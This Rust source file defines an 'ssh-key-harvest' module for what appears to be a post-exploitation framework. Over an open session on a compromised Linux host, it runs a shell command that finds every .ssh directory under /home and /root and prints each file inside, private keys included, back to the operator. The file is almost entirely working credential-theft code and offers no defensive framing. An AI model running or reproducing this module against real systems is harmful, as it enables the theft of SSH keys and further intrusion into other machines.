use crate::core::modules::Module;
use crate::core::loghandler::LogHandler;
use crate::cli::output::send_command_and_get_output_until;

pub struct SshKeyHarvestLinux;

impl Module for SshKeyHarvestLinux {
    fn name(&self) -> &'static str { "linux/ssh-key-harvest" }
    fn description(&self) -> &'static str { "Harvest all user SSH private keys from /home and /root" }
    fn usage(&self) -> &'static str { "Usage: run-module linux/ssh-key-harvest <session_id>" }
    fn platform(&self) -> &'static str { "linux" }
    fn category(&self) -> &'static str { "credentials" }
    fn run(&self, session_id: usize, session_manager: &crate::core::session::SessionManager, _args: Vec<String>) {
        if let Some(session) = session_manager.get(session_id) {
            let marker = "__AEGIS_END__";
            let cmd = format!(
                "find /home /root -type d -name .ssh 2>/dev/null | while read dir; do for file in \"$dir\"/*; do if [ -f \"$file\" ]; then echo \"===== $file =====\"; cat \"$file\"; echo; fi; done; done; echo {}\n",
                marker
            );
            match send_command_and_get_output_until(&session, &cmd, marker) {
                Ok(data) => {
                    if let Some(idx) = data.windows(marker.len()).rposition(|window| window == marker.as_bytes()) {
                        let output = &data[..idx];
                        println!("{}", String::from_utf8_lossy(output));
                        LogHandler::success("Harvested SSH-related files");
                    } else {
                        LogHandler::error("End marker not found in output");
                    }
                }
                Err(e) => LogHandler::error(&format!("Failed to harvest SSH keys: {}", e)),
            }
        }
    } 
}